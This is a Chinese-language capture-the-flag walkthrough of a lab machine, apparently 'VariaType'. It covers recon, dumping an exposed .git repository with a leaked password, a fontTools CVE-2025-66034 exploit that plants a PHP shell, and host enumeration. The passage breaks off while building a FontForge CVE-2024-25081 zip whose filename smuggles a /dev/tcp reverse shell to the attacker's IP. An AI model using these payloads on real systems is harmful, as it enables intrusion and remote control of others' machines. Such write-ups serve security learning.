![image.png|1208](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260321200202287.png)

---
## 信息收集
### 端口扫描
```shell
┌──(kali㉿kali)-[~]
└─$ nmap -sS -Pn -T4 -O -sC -sV  10.129.244.202
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-21 09:02 EDT
Nmap scan report for 10.129.244.202
Host is up (0.22s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 e0:b2:eb:88:e3:6a:dd:4c:db:c1:38:65:46:b5:3a:1e (ECDSA)
|_  256 ee:d2:bb:81:4d:a2:8f:df:1c:50:bc:e1:0e:0a:d1:22 (ED25519)
80/tcp open  http?
Aggressive OS guesses: Linux 4.15 - 5.19 (98%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (98%), Linux 5.0 - 5.14 (94%), Linux 3.2 - 4.14 (94%), Linux 4.15 (94%), Linux 2.6.32 - 3.10 (93%), OpenWrt 21.02 (Linux 5.4) (93%), Linux 2.6.32 (92%), Linux 3.4 - 3.10 (92%), Linux 5.10 - 5.15 (92%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 272.68 seconds
                                                                                                                                                                
┌──(kali㉿kali)-[~]
└─$ nmap -p 80 --script http-title,http-methods,http-vhosts --script-timeout 30s 10.129.244.202
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-21 09:09 EDT
Nmap scan report for 10.129.244.202
Host is up (0.18s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-vhosts: 
|_128 names had status 301

Nmap done: 1 IP address (1 host up) scanned in 31.15 seconds
                                                                                                                                                                
┌──(kali㉿kali)-[~]
└─$  curl -I 10.129.244.202
HTTP/1.1 301 Moved Permanently
Server: nginx/1.22.1
Date: Sat, 21 Mar 2026 13:10:10 GMT
Content-Type: text/html
Content-Length: 169
Connection: keep-alive
Location: http://variatype.htb/
                                                                                                                                                        
┌──(kali㉿kali)-[~]

```
### 枚举dns子域名
```shell
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -H "Host: FUZZ.variatype.htb" \
     -u http://variatype.htb -fs 178

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://variatype.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.variatype.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

portal                  [Status: 200, Size: 2494, Words: 445, Lines: 59, Duration: 257ms]
i                       [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 4959ms]
hermes                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 1413ms]
reseller                [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 1867ms]
preprod                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 206ms]
web6                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 264ms]
igk                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 937ms]
studio                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 762ms]
vps2                    [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 821ms]
sub                     [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 1879ms]
podcast                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 3643ms]
portal2                 [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 3409ms]
messenger               [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 7179ms]
bm                      [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 1841ms]

```
### 访问http://variatype.htb/，失败，添加hosts记录
```shell
echo "10.129.244.202 variatype.htb portal.variatype.htb" | sudo tee -a /etc/hosts
```
### 访问web页面
![image.png|853](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260321211217055.png)

![image.png|846](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260322204422911.png)


![image.png|800](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260321213728892.png)


![image.png|800](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260321213334041.png)


### 扫描portal.variatype.htb目录
```shell
└─$ python dirsearch.py -u http://portal.variatype.htb/
/home/kali/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11710

Output: /home/kali/dirsearch/reports/http_portal.variatype.htb/__26-03-21_09-24-47.txt

Target: http://portal.variatype.htb/

[09:24:47] Starting: 
[09:25:01] 403 -  555B  - /.git/                                            
[09:25:01] 403 -  555B  - /.git/hooks/
[09:25:01] 403 -  555B  - /.git/branches/
[09:25:01] 403 -  555B  - /.git/info/                                       
[09:25:01] 200 -  240B  - /.git/info/exclude
[09:25:01] 403 -  555B  - /.git/logs/                                       
[09:25:01] 200 -  700B  - /.git/logs/HEAD                                   
[09:25:01] 403 -  555B  - /.git/refs/
[09:25:01] 403 -  555B  - /.git/objects/                                    
[09:25:01] 200 -  700B  - /.git/logs/refs/heads/master
[09:26:20] 403 -  555B  - /files/                                            
                                                                              
Task Completed
                  
```

```shell
└─$ git-dumper http://portal.variatype.htb/.git ./variatype_git 
[-] Testing http://portal.variatype.htb/.git/HEAD [200]
[-] Testing http://portal.variatype.htb/.git/ [403]
[-] Fetching common files
[-] Fetching http://portal.variatype.htb/.gitignore [404]
[-] http://portal.variatype.htb/.gitignore responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/COMMIT_EDITMSG [200]
[-] Fetching http://portal.variatype.htb/.git/description [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/post-receive.sample [404]
[-] http://portal.variatype.htb/.git/hooks/post-receive.sample responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/post-commit.sample [404]
[-] http://portal.variatype.htb/.git/hooks/post-commit.sample responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://portal.variatype.htb/.git/hooks/update.sample [200]
[-] Fetching http://portal.variatype.htb/.git/objects/info/packs [404]
[-] http://portal.variatype.htb/.git/objects/info/packs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://portal.variatype.htb/.git/index [200]
[-] Fetching http://portal.variatype.htb/.git/info/exclude [200]
[-] Finding refs/
[-] Fetching http://portal.variatype.htb/.git/FETCH_HEAD [404]
[-] http://portal.variatype.htb/.git/FETCH_HEAD responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/ORIG_HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/info/refs [404]
[-] http://portal.variatype.htb/.git/info/refs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/config [200]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/master [200]
[-] Fetching http://portal.variatype.htb/.git/logs/HEAD [200]
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/logs/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/HEAD [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/HEAD responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/main [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/master [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/staging [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/production [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/remotes/origin/development [404]
[-] http://portal.variatype.htb/.git/logs/refs/remotes/origin/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/logs/refs/stash [404]
[-] http://portal.variatype.htb/.git/logs/refs/stash responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/packed-refs [404]
[-] http://portal.variatype.htb/.git/packed-refs responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/heads/master [200]
[-] Fetching http://portal.variatype.htb/.git/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/main [404]
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/HEAD [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/HEAD responded with status code 404
[-] http://portal.variatype.htb/.git/refs/remotes/origin/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/master [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/staging [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/development [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/remotes/origin/production [404]
[-] http://portal.variatype.htb/.git/refs/remotes/origin/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/stash [404]
[-] http://portal.variatype.htb/.git/refs/stash responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/master [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/main [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/main responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/wip/wtree/refs/heads/development responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/master [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/master responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/production [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/production responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/staging [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/staging responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/refs/wip/index/refs/heads/development [404]
[-] http://portal.variatype.htb/.git/refs/wip/index/refs/heads/development responded with status code 404
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching http://portal.variatype.htb/.git/objects/61/5e621dce970c2c1c16d2a1e26c12658e3669b3 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/75/3b5f5957f2020480a19bf29a0ebc80267a4a3d [200]
[-] Fetching http://portal.variatype.htb/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] http://portal.variatype.htb/.git/objects/00/00000000000000000000000000000000000000 responded with status code 404
[-] Fetching http://portal.variatype.htb/.git/objects/50/30e791b764cb2a50fcb3e2279fea9737444870 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/6f/021da6be7086f2595befaa025a83d1de99478b [200]
[-] Fetching http://portal.variatype.htb/.git/objects/c6/ea13ef05d96cf3f35f62f87df24ade29d1d6b4 [200]
[-] Fetching http://portal.variatype.htb/.git/objects/03/0e929d424a937e9bd079794a7e1aaf366bcfaf [200]
[-] Fetching http://portal.variatype.htb/.git/objects/b3/28305f0e85c2b97a7e2a94978ae20f16db75e8 [200]
[-] Running git checkout .
                            
                  
```

```shell
└─$ cd variatype_git 
                                                                                                                                                                
(ack) ┌──(kali㉿kali)-[~/Desktop/variatype_git]
└─$ ls -la
total 16
drwxrwxr-x 3 kali kali 4096 Mar 22 08:28 .
drwxr-xr-x 4 kali kali 4096 Mar 22 08:28 ..
-rw-rw-r-- 1 kali kali   36 Mar 22 08:28 auth.php
drwxrwxr-x 7 kali kali 4096 Mar 22 08:28 .git
                                                                                                                                                                
(ack) ┌──(kali㉿kali)-[~/Desktop/variatype_git]
└─$ git log -p
commit 753b5f5957f2020480a19bf29a0ebc80267a4a3d (HEAD -> master)
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:59:33 2025 -0500

    fix: add gitbot user for automated validation pipeline

diff --git a/auth.php b/auth.php
index 615e621..b328305 100644
--- a/auth.php
+++ b/auth.php
@@ -1,3 +1,5 @@
 <?php
 session_start();
-$USERS = [];
+$USERS = [
+    'gitbot' => 'G1tB0t_Acc3ss_2025!'
+];

commit 5030e791b764cb2a50fcb3e2279fea9737444870
Author: Dev Team <dev@variatype.htb>
Date:   Fri Dec 5 15:57:57 2025 -0500

    feat: initial portal implementation

diff --git a/auth.php b/auth.php
new file mode 100644
index 0000000..615e621
--- /dev/null
+++ b/auth.php
@@ -0,0 +1,3 @@
+<?php
+session_start();
+$USERS = [];
                                                                                                                                                                
(ack) ┌──(kali㉿kali)-[~/Desktop/variatype_git]
└─$ 

```



![image.png|1013](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260322203712126.png)

### 搜索 fontTools的漏洞，得到fontTools varLib CVE-2025-66034 

```
https://github.com/advisories/GHSA-768j-98cg-p3fv

https://github.com/symphony2colour/varlib-cve-2025-66034
```



```shell
└─$ python varlib_cve_2025_66034.py --ip 10.10.15.93 --port 5678 --path /var/www/portal.variatype.htb/public/files/ --url http://variatype.htb/tools/variable-font-generator/process --trigger http://portal.variatype.htb/files
[INFO] [+] Generating compatible master fonts...
[INFO] [+] Generating shell name...
[INFO] [+] Using IP address: 10.10.15.93 and Port Number: 5678
[INFO] [+] Using shell name shell_rl5fwbtl.php
[INFO] [+] Creating malicious designspace...
[INFO] [+] Uploading payload...
[INFO] [+] Server status: 200
[INFO] [+] Starting listener on port 5678...
[INFO] [+] Triggering shell via http://portal.variatype.htb/files/shell_rl5fwbtl.php
[INFO] [+] Trigger request status: 200
```


```shell
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -vnlp 5678
listening on [any] 5678 ...
connect to [10.10.15.93] from (UNKNOWN) [10.129.244.202] 58780
bash: cannot set terminal process group (3574): Inappropriate ioctl for device
bash: no job control in this shell
www-data@variatype:~/portal.variatype.htb/public/files$ pwd
pwd
/var/www/portal.variatype.htb/public/files
www-data@variatype:~/portal.variatype.htb/public/files$ ls
ls
shell_rl5fwbtl.php
variabype_ecDTMwT8iq0.ttf
www-data@variatype:~/portal.variatype.htb/public/files$ whoami
whoami
www-data
www-data@variatype:~/portal.variatype.htb/public/files$ 

```

![image.png|1019](https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20260322212008873.png)

---
## 横向移动
### 查看用户信息、遍历目录文件
```shell
www-data@variatype:~/portal.variatype.htb$ cd /home
cd /home
www-data@variatype:/home$ ls
ls
steve
www-data@variatype:/home$ cd steve
cd steve
bash: cd: steve: Permission denied
www-data@variatype:/home$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
variatype:x:102:110::/nonexistent:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false

#浏览目录

www-data@variatype:~/portal.variatype.htb/public/files$ cd /
cd /

#找所有用户可写的目录
www-data@variatype:/$ find / -type d -writable 2>/dev/null | grep -v proc
find / -type d -writable 2>/dev/null | grep -v proc
/var/lib/nginx/proxy
/var/lib/nginx/scgi
/var/lib/nginx/fastcgi
/var/lib/nginx/fastcgi/1
/var/lib/nginx/fastcgi/1/00
/var/lib/nginx/fastcgi/2
/var/lib/nginx/fastcgi/2/00
/var/lib/nginx/body
/var/lib/nginx/uwsgi
/var/lib/php/sessions
/var/tmp
/var/www/portal.variatype.htb/public
/var/www/portal.variatype.htb/public/files
/dev/mqueue
/dev/shm
/etc/vmware-tools/locations.lck
/tmp
/tmp/.ICE-unix
/tmp/.font-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/run/php
/run/lock

#找所有属于 steve 的文件
www-data@variatype:/$ find / -user steve 2>/dev/null | head -20
find / -user steve 2>/dev/null | head -20
/home/steve
/opt/process_client_submissions.bak

# 找包含敏感关键词的文件
www-data@variatype:/$ grep -r "password\|secret\|token" /opt /home /var 2>/dev/null | head -20
<cret\|token" /opt /home /var 2>/dev/null | head -20
/opt/variatype/app.py:import secrets
/opt/variatype/app.py:app.secret_key = '7e052f614c5f9d5da3249cc4c6d9a950053aed370b8464d2e8a81d41ff0e3371'
/opt/variatype/app.py:    unique_id = secrets.token_urlsafe(8)
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en: based upload, proxies, cookies, user+password authentication (Basic, Digest,
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en: form based upload, proxies, cookies, user+password authentication (Basic,
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en: form based upload, proxies, cookies, user+password authentication (Basic,
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en: form based upload, proxies, cookies, user+password authentication (Basic,
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en: form based upload, proxies, cookies, user+password authentication (Basic,
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en: form based upload, proxies, cookies, user+password authentication (Basic,
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en: form based upload, proxies, cookies, user+password authentication (Basic,
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en: form based upload, proxies, cookies, user+password authentication (Basic,
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en: This package contains an authentication plugin allowing password and user
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en:  - public key methods, including RSA and Elliptic curves, as well as password
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en:  - HSMs and cryptographic tokens, via PKCS #11.
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en:  - public key methods, including RSA and Elliptic curves, as well as password
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en:  - HSMs and cryptographic tokens, via PKCS #11.
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en:  - public key methods, including RSA and Elliptic curves, as well as password
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en:  - HSMs and cryptographic tokens, via PKCS #11.
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en:  - public key methods, including RSA and Elliptic curves, as well as password
/var/lib/apt/lists/security.debian.org_debian-security_dists_bookworm-security_main_i18n_Translation-en:  - HSMs and cryptographic tokens, via PKCS #11.
www-data@variatype:/$
```

### 可以看到steve用户有/opt/process_client_submissions.bak的权限
```shell
bash: no job control in this shell
www-data@variatype:~/portal.variatype.htb/public/files$ cd /opt
cd /opt
www-data@variatype:/opt$ ls -la
ls -la
total 20
drwxr-xr-x  4 root      root      4096 Mar  9 08:29 .
drwxr-xr-x 18 root      root      4096 Mar  9 08:29 ..
drwxr-xr-x  3 root      root      4096 Mar  9 08:29 font-tools
-rwxr-xr--  1 steve     steve     2018 Feb 26 07:50 process_client_submissions.bak
drwxr-xr-x  4 variatype variatype 4096 Mar  9 08:29 variatype
www-data@variatype:/opt$ cat process_client_submissions.bak
cat process_client_submissions.bak
#!/bin/bash
#
# Variatype Font Processing Pipeline
# Author: Steve Rodriguez <steve@variatype.htb>
# Only accepts filenames with letters, digits, dots, hyphens, and underscores.
#

set -euo pipefail

UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
PROCESSED_DIR="/home/steve/processed_fonts"
QUARANTINE_DIR="/home/steve/quarantine"
LOG_FILE="/home/steve/logs/font_pipeline.log"

mkdir -p "$PROCESSED_DIR" "$QUARANTINE_DIR" "$(dirname "$LOG_FILE")"

log() {
    echo "[$(date --iso-8601=seconds)] $*" >> "$LOG_FILE"
}

cd "$UPLOAD_DIR" || { log "ERROR: Failed to enter upload directory"; exit 1; }

shopt -s nullglob

EXTENSIONS=(
    "*.ttf" "*.otf" "*.woff" "*.woff2"
    "*.zip" "*.tar" "*.tar.gz"
    "*.sfd"
)

SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'

found_any=0
for ext in "${EXTENSIONS[@]}"; do
    for file in $ext; do
        found_any=1
        [[ -f "$file" ]] || continue
        [[ -s "$file" ]] || { log "SKIP (empty): $file"; continue; }

        # Enforce strict naming policy
        if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then
            log "QUARANTINE: Filename contains invalid characters: $file"
            mv "$file" "$QUARANTINE_DIR/" 2>/dev/null || true
            continue
        fi

        log "Processing submission: $file"

        if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
import sys
try:
    font = fontforge.open('$file')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process $file: {e}', file=sys.stderr)
    sys.exit(1)
"; then
            log "SUCCESS: Validated $file"
        else
            log "WARNING: FontForge reported issues with $file"
        fi

        mv "$file" "$PROCESSED_DIR/" 2>/dev/null || log "WARNING: Could not move $file"
    done
done

if [[ $found_any -eq 0 ]]; then
    log "No eligible submissions found."
fi
www-data@variatype:/opt$ 

```

### 下面是对process_client_submissions.bak的分析：
```shell
┌─────────────────────────────────────────────────────┐
│  1. 脚本启动（由 cron 每 5 分钟触发一次）              │
│     $ crontab -l                                     │
│     */5 * * * * steve /opt/process_client_submissions.bak │
└─────────────────┬───────────────────────────────────┘
                  ▼
┌─────────────────────────────────────────────────────┐
│  2. 初始化环境                                        │
│     • 创建必要目录：                                 │
│       - /home/steve/processed_fonts/  (归档合法文件)  │
│       - /home/steve/quarantine/       (隔离可疑文件)  │
│       - /home/steve/logs/             (写日志)        │
│     • 定义日志函数 log()                             │
└─────────────────┬───────────────────────────────────┘
                  ▼
┌─────────────────────────────────────────────────────┐
│  3. 进入上传目录                                      │
│     cd /var/www/portal.variatype.htb/public/files/   │
│     （这是 Web 用户上传文件的地方，www-data 可写）     │
└─────────────────┬───────────────────────────────────┘
                  ▼
┌─────────────────────────────────────────────────────┐
│  4. 遍历特定扩展名的文件                              │
│     检查的文件类型：                                 │
│     • 字体文件：.ttf .otf .woff .woff2 .sfd          │
│     • 压缩包：.zip .tar .tar.gz                      │
│                                                      │
│     对每个文件执行：                                 │
│     ├─▶ 检查是否为空？→ 空则跳过                      │
│     ├─▶ 检查文件名是否合法？→ 不合法则隔离            │
│     │   合法文件名正则：^[a-zA-Z0-9._-]+$           │
│     │   （只允许字母、数字、点、下划线、连字符）      │
│     │                                                │
│     └─▶ 文件名合法 → 进入核心处理步骤 ▼              │
└─────────────────┬───────────────────────────────────┘
                  ▼
┌─────────────────────────────────────────────────────┐
│  5. 核心：调用 FontForge 验证字体                  │
│                                                      │
│     timeout 30 /usr/local/src/fontforge/build/bin/fontforge \
│       -lang=py -c "                                  │
│         import fontforge                             │
│         font = fontforge.open('$file')  # ← 关键！   │
│         # ... 获取字体信息 ...                        │
│       "                                              │
│                                                      │
│     • 如果 FontForge 成功打开文件 → 记录"SUCCESS"    │
│     • 如果 FontForge 报错 → 记录"WARNING"            │
│     • 超时 30 秒强制终止                             │
└─────────────────┬───────────────────────────────────┘
                  ▼
┌─────────────────────────────────────────────────────┐
│  6. 移动文件到归档目录                                │
│     mv "$file" /home/steve/processed_fonts/          │
│     （无论验证成功与否，文件都会被移走）               │
└─────────────────┬───────────────────────────────────┘
                  ▼
┌─────────────────────────────────────────────────────┐
│  7. 脚本结束，等待下一次 cron 触发（5 分钟后）         │
└─────────────────────────────────────────────────────┘
```
### `process_client_submissions.bak` 是 steve 用户写的"字体文件自动质检脚本"，它定时扫描 Web 上传目录，用 FontForge 验证字体文件，但由于信任了"文件名合法=内容安全"，攻击者可上传"文件名合规但内容恶意"的字体文件，触发 FontForge 漏洞，从而以 steve 身份执行任意代码，实现横向移动

### 查看FontForge 版本：20230101
```shell
www-data@variatype:/opt$ /usr/local/src/fontforge/build/bin/fontforge --version
<r/local/src/fontforge/build/bin/fontforge --version
Copyright (c) 2000-2025. See AUTHORS for Contributors.
 License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
 with many parts BSD <http://fontforge.org/license.html>. Please read LICENSE.
 Version: 20230101
 Based on sources from 2025-12-07 11:44 UTC-D.
 Based on source from git with hash: a1dad3e81da03d5d5f3c4c1c1b9b5ca5ebcfcecf
fontforge 20230101
build date: 2025-12-07 11:44 UTC
www-data@variatype:/opt$ 
```
#### **CVE-2024-25081** 影响 FontForge **20230101 及之前**的版本：
```shell
www-data@variatype:/tmp/exploit$ cat > /tmp/create_zip.py << 'EOF'
import zipfile

# 恶意文件名：反弹 shell 命令
malicious_name = '$(bash -c "bash -i >& /dev/tcp/10.10.15.93/4444 0>&1")'

